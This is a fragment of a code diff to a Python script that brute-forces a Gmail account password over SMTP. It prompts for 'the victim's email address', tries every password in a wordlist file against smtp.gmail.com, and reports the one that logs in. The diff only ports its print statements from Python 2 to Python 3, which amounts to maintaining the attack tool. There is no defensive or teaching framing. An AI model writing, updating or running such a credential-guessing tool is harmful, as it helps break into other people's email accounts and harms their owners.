@@ -29,8 +29,8 @@ smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
 smtpserver.starttls()
  
-print bcolors.BOLD + "Welcome" + bcolors.ENDC
-print bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC
+print(bcolors.BOLD + "Welcome" + bcolors.ENDC)
+print(bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
  
 user = raw_input("Enter the victim's email address: ")
 passwfile = "psw.list"
@@ -39,7 +39,7 @@ passwfile = open(passwfile, "r")
 for password in passwfile:
 	try:
 		smtpserver.login(user, password)
-		print bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC
+		print(bcolors.UNDERLINE + "Password Found: %s"  % password + bcolors.ENDC)
 		break;
 	except smtplib.SMTPAuthenticationError:
-		print bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC
+		print(bcolors.FAIL + "Password Incorrect: %s" % password + bcolors.ENDC)
